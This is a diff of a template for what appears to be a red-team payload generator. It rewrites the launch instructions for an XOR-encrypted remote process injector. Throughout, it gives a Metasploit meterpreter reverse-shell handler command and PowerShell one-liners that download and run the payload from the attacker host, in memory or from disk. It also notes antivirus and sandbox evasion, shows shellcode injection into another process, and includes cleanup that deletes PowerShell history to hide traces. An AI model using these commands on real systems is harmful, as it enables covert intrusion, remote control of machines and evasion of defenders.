@@ -104,40 +104,57 @@ output:
     enabled: true
     command: "mcs -out:{{ output_path }}/{{ output_file }} {{ source_file }}"
   launch_instructions: |
-    Remote Process Injector, XOR - Launch Instructions
+    # Start Listener
 
-    Start Listener:
-    $ msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+    ```bash
+    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+    ```
 
-    In-Memory Execution:
-    $ powershell -ep bypass -c "$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/{{ output_file }}'); $assem = [System.Reflection.Assembly]::Load($data); [Program]::Main('explorer'.Split())"
+    # In-Memory Execution
 
-    Traditional Execution (File-Based):
-    $ python3 -m http.server 80
-    $ powershell -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }} notepad"
+    ```powershell
+    powershell -ep bypass -c "$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/{{ output_file }}'); $assem = [System.Reflection.Assembly]::Load($data); [Program]::Main('explorer'.Split())"
+    ```
 
-    Notes:
-    - XOR encrypted with key: 0x{{ xor_key }} (basic AV evasion)
+    # Traditional Execution (File-Based)
+
+    **Attacker:**
+    ```bash
+    python3 -m http.server 80
+    ```
+
+    **Target:**
+    ```powershell
+    powershell -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }} notepad"
+    ```
+
+    # Noteses
+
+    - XOR encrypted with key: `0x{{ xor_key }}` (basic AV evasion)
     - NUMA-based sandbox detection (fails on sandboxes without NUMA support)
-    - Auto-selects target: {{ elevated_target }} (elevated) or {{ default_target }} (normal user)
+    - Auto-selects target: `{{ elevated_target }}` (elevated) or `{{ default_target }}` (normal user)
     - Can specify custom target process as argument (e.g., notepad, explorer, chrome)
     - Uses VirtualAllocEx to allocate RWX memory in target process
     - WriteProcessMemory copies XOR-decrypted shellcode to target
     - CreateRemoteThread executes payload in target process
-    - EXITFUNC=thread ensures clean exit without crashing target process
-    - Reverse shell connects to {{ lhost }}:{{ lport }}
+    - `EXITFUNC=thread` ensures clean exit without crashing target process
+    - Reverse shell connects to `{{ lhost }}:{{ lport }}`
     - Requires matching architecture (x64 payload → x64 process)
     - Sysmon Event ID 8 (CreateRemoteThread) will fire on injection
 
-    Troubleshooting:
-    - Injection fails: Verify target process running with `Get-Process notepad` or `tasklist | findstr notepad`
-    - No connection: Check firewall rules on attacker (allow {{ lport }}/tcp)
-    - Access Denied: May need administrative privileges for certain targets (system processes)
-    - Process crashes: Verify x64 payload for x64 process; check shellcode compatibility
-    - AV blocks: XOR weak; consider AES or additional obfuscation/packing
-    - NUMA check fails: Some VMs/sandboxes don't support NUMA; tool will exit
+    # Troubleshooting
 
-    Cleanup:
-    On target:
-    $ Remove-Item {{ output_file }} -Force -ErrorAction SilentlyContinue
-    $ Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+    - **Injection fails:** Verify target process running with `Get-Process notepad` or `tasklist | findstr notepad`
+    - **No connection:** Check firewall rules on attacker (allow `{{ lport }}/tcp`)
+    - **Access Denied:** May need administrative privileges for certain targets (system processes)
+    - **Process crashes:** Verify x64 payload for x64 process; check shellcode compatibility
+    - **AV blocks:** XOR weak; consider AES or additional obfuscation/packing
+    - **NUMA check fails:** Some VMs/sandboxes don't support NUMA; tool will exit
+
+    # Cleanup
+
+    **Target:**
+    ```powershell
+    Remove-Item {{ output_file }} -Force -ErrorAction SilentlyContinue
+    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+    ```
